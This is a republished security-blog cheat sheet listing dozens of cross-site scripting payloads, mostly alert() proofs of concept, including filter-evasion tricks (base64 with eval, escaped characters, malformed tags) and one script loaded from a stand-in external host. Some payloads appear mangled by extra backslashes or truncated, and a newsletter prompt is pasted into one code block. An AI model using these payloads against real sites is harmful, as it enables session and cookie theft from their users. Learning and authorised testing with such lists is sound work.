# :globe_with_meridians: Crafting XSS (Cross-Site Scripting) payloads

> **Original Source:** [Crafting XSS (Cross-Site Scripting) payloads](https://infosecwriteups.com/crafting-xss-cross-site-scripting-payloads-919f62171bd0)
> **Platform:** infosecwriteups.com | **Category:** `WEB`

---

# Crafting XSS (Cross-Site Scripting) payloads


Crafting XSS (Cross-Site Scripting) payloads is a significant aspect of learning about web application security, particularly for educational and ethical hacking purposes. Here, some generic examples of XSS payloads. Remember, these should only be used in legal, ethical contexts, such as in a lab environment, CTF (Capture the Flag) competitions, or when you have explicit permission to test a system.

### Basic Alert:


```
<script>alert('XSS')</script>
```


### Document Cookie Access:


```
<script>alert(document.cookie)</script>
```


### JavaScript Execution:


```
<img src=x onerror=alert('XSS')>
```


### Using JavaScript URI:


```
javascript:alert('XSS')
```


### Executing Code from External Source:


```
<script src="<http://example.com/xss.js>"></script>
```


### HTML Injection:


```
<div onclick="alert('XSS')">Click me</div>
```


### Event Handler:


```
<body onload=alert('XSS')>
```


### Using SVG:


```
<svg/onload=alert('XSS')>
```


### Embedding in Style Tags:


```
<style>@import 'javascript:alert("XSS")';</style>
```


### Using Iframe:


```
<iframe src="javascript:alert('XSS')"></iframe>
```


### Non-Alpha-Non-Digit XSS:


```
<script>\\\\\\\\x3Cscript>\\\\\\\\x61\\\\\\\\x6C\\\\\\\\x65\\\\\\\\x72\\\\\\\\x74(1)//\\\\\\\\x3C/script></script>
```


### Using `document.domain`:


```
<script>alert(document.domain)</script>
```


### Using HTML Entities:


```
&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;
```


### Breaking out of HTML Attributes:


```
<input value="<script>alert('XSS')</script>">
```


Using `eval()`:


```
<script>eval('al'+'ert(1)')</script>
```


### Breaking out of URL Parameters:


```
<http://example.com/?param=><script>alert('XSS')</script>
```


### Using Base64:


```
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```


### Exploiting innerHTML:


```
<div id="div" onmouseover="this.innerHTML='<img src=x onerror=alert(1)>'">Hover over me!</div>
```


Using `setTimeout`:


```
<script>setTimeout('alert("XSS")', 1000)</script>
```


### UTF-8 Encoded Payloads:


```
<script>\\\\\\\\u003Cscript>\\\\\\\\u0061\\\\\\\\u006C\\\\\\\\u0065\\\\\\\\u0072\\\\\\\\u0074(1)//\\\\\\\\u003C/script></script>
```


### Using Object Tags:


```
<object data="javascript:alert('XSS');"></object>
```


### Using Embed Tags:


```
<embed src="javascript:alert('XSS');">
```


Utilizing `onmouseover`:


```
<img src="#" onmouseover="alert('XSS')">
```


Using `onfocus`:


```


## Get Security Lit Limited’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in
<input onfocus="alert('XSS')">
```


Utilizing `onerror` with Invalid Image Source:


```
<img src="invalid" onerror="alert('XSS')">
```


### Malformed HTML Tags:


```
<scr<script>ipt>alert('XSS')</scr</script>ipt>
```


Using `srcdoc` in Iframe:


```
<iframe srcdoc="<p onclick='alert(1)'>Click me</p>"></iframe>
```


Exploiting `onload` in Body Tag:


```
<body onload=alert('XSS')>
```


### Encoding with Decimal HTML Entities:


```
&#60;script&#62;alert('XSS')&#60;/script&#62;
```


Using `data:` URI:


```
<object data="data:text
```


### Using Unicode:


```
<script>\u0061lert(1)</script>j
```


### Breaking Out of Script Context:


```
</script><script>alert('XSS')</script>
```


Using `onerror` with Script Tags:


```
<script src="http://example.com/nonexistent.js" onerror="alert('XSS')"></script>
```


### Using MathML:


```
<math><mtext>]]><script>alert('XSS')</script></mtext></math>
```


### Exploiting ContentEditable:


```
<div contenteditable onfocus="alert('XSS')">Click and type something</div>
```


Using `document.write`:


```
<script>document.write('<script>alert("XSS")<\/script>');</script>
```


Exploiting `ondblclick`:


```
<div ondblclick="alert('XSS')">Double Click Me</div>
```


### Using VBScript in IE:


```
<script language="vbscript">msgbox "XSS"</script>
```


Utilizing `execScript` in IE:


```
<script>execScript("alert('XSS')", "vbscript")</script>
```


### Using XML Entities:


```
<foo><![CDATA[<]]><script>alert('XSS')</script>]]></foo>
```


Exploiting `onblur`:


```
<input onblur="alert('XSS')" autofocus>
```


Using `onchange`:


```
<input onchange="alert('XSS')">
```


Using `onsubmit`:


```
<form onsubmit="alert('XSS')">
```


### Breaking Out of CSS Context:


```
<style>body{background:url("javascript:alert('XSS')");}</style>
```


### Using Frame Source:


```
<frame src="javascript:alert('XSS');">
```


Utilizing `document.domain` with `iframe`:


```
<iframe src="javascript:alert(document.domain)"></iframe>
```


Exploiting `onresize`:


```
<div onresize="alert('XSS')" style="resize:both; overflow:auto;">Resize Me</div>
```


Using `onclick`:


```
<button onclick="alert('XSS')">Click Me</button>
```


Exploiting `href` with JavaScript:


```
<a href="javascript:alert('XSS')">Click Here</a>
```

---

*Originally published on [Medium](https://infosecwriteups.com/crafting-xss-cross-site-scripting-payloads-919f62171bd0). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of web CTF writeups.*
